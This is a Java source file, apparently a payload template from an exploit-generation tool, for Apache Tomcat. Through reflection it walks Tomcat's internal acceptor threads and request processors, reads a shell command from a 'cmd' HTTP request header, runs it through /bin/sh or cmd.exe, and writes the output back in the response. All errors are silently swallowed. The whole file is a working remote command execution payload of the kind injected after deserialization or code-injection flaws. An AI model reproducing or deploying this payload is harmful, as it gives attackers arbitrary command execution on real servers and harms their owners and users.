package jeg.core.template.tomcat;

import java.io.InputStream;
import java.io.Writer;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Scanner;

public class TomcatCmdExecTpl {

    public TomcatCmdExecTpl() {
        run();
    }

    // 传参：需要执行的命令
    private String getReqHeaderName() {
        return "cmd";
    }


    private void run() {
        try {
            Method var0 = Thread.class.getDeclaredMethod("getThreads", (Class[]) (new Class[0]));
            var0.setAccessible(true);
            Thread[] var1 = (Thread[]) ((Thread[]) var0.invoke((Object) null));
            for (int var2 = 0; var2 < var1.length; ++var2) {
                if (var1[var2].getName().contains("http") && var1[var2].getName().contains("Acceptor")) {
                    Field var3 = var1[var2].getClass().getDeclaredField("target");
                    var3.setAccessible(true);
                    Object var4 = var3.get(var1[var2]);

                    try {
                        var3 = var4.getClass().getDeclaredField("endpoint");
                    } catch (NoSuchFieldException var15) {
                        var3 = var4.getClass().getDeclaredField("this$0");
                    }

                    var3.setAccessible(true);
                    var4 = var3.get(var4);

                    try {
                        var3 = var4.getClass().getDeclaredField("handler");
                    } catch (NoSuchFieldException var14) {
                        try {
                            var3 = var4.getClass().getSuperclass().getDeclaredField("handler");
                        } catch (NoSuchFieldException var13) {
                            var3 = var4.getClass().getSuperclass().getSuperclass().getDeclaredField("handler");
                        }
                    }

                    var3.setAccessible(true);
                    var4 = var3.get(var4);

                    try {
                        var3 = var4.getClass().getDeclaredField("global");
                    } catch (NoSuchFieldException var12) {
                        var3 = var4.getClass().getSuperclass().getDeclaredField("global");
                    }

                    var3.setAccessible(true);
                    var4 = var3.get(var4);
                    var4.getClass().getClassLoader().loadClass("org.apache.coyote.RequestGroupInfo");
                    if (var4.getClass().getName().contains("org.apache.coyote.RequestGroupInfo")) {
                        var3 = var4.getClass().getDeclaredField("processors");
                        var3.setAccessible(true);
                        ArrayList var5 = (ArrayList) var3.get(var4);

                        for (int var6 = 0; var6 < var5.size(); ++var6) {
                            var3 = var5.get(var6).getClass().getDeclaredField("req");
                            var3.setAccessible(true);
                            var4 = var3.get(var5.get(var6)).getClass().getDeclaredMethod("getNote", Integer.TYPE).invoke(var3.get(var5.get(var6)), 1);
                            String var7;
                            try {
                                var7 = (String) var3.get(var5.get(var6)).getClass().getMethod("getHeader", new Class[]{String.class}).invoke(var3.get(var5.get(var6)), new Object[]{getReqHeaderName()});
                                if (var7 != null) {
                                    Object response = var4.getClass().getDeclaredMethod("getResponse", new Class[0]).invoke(var4, new Object[0]);
                                    Writer writer = (Writer) response.getClass().getMethod("getWriter", new Class[0]).invoke(response, new Object[0]);
                                    writer.write(exec(var7));
                                    writer.flush();
                                    writer.close();
                                    break;
                                }
                            } catch (Exception ignored) {
                            }

                        }
                    }
                }
            }
        } catch (Throwable ignored) {
        }

    }

    // 执行模块
    private  String exec(String cmd) {
        try {
            boolean isLinux = true;
            String osType = System.getProperty("os.name");
            if (osType != null && osType.toLowerCase().contains("win")) {
                isLinux = false;
            }

            String[] cmds = isLinux ? new String[]{"/bin/sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = new Scanner(in).useDelimiter("\\a");
            String execRes = "";
            while (s.hasNext()) {
                execRes += s.next();
            }
            return execRes;
        } catch (Exception e) {
            return e.getMessage();
        }
    }
}
